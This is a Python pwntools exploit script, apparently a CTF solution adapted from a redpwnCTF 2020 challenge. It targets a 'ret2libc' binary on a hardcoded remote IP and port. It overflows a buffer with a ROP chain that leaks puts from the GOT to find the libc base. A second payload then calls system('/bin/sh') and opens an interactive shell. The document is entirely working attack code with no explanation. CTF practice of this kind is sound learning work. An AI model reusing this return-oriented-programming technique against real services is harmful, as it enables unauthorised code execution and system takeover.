#!/usr/bin/env python3

# Made from the script i used in redpwnCTF 2020 for the-library

from pwn import *

host = "143.198.127.103"
port = 42001
elf = ELF("./ret2libc")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary = elf
#p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
p = remote(host,port)

# Step One Libc base leak
learn = p64(0x000000000040139b)
puts_plt = p64(0x0000000000401030)
puts_got = p64(0x405018)
pop_rdi = p64(0x000000000040155b)
ret = p64(0x0000000000401016)
padding = bytes("a"*40,'utf-8')
payload1 = padding + pop_rdi + puts_got + puts_plt + learn
p.recvuntil("[y/N]")
p.sendline(payload1)
p.recvuntil("natural!")
p.recvline()
p.recvline()
leak = p.recvline()
print(leak)

leak = u64(leak[:8].strip().ljust(8, b'\x00'))
base = leak - libc.symbols["puts"]
print("Base address:" + hex(base))

#Step Two: Get Shell
bin_sh = p64(base + next(libc.search(b"/bin/sh")))
system = p64(base + libc.symbols["system"])
payload2 = padding + pop_rdi + bin_sh + system
p.recvuntil("[y/N]")
p.sendline(payload2)

p.interactive()
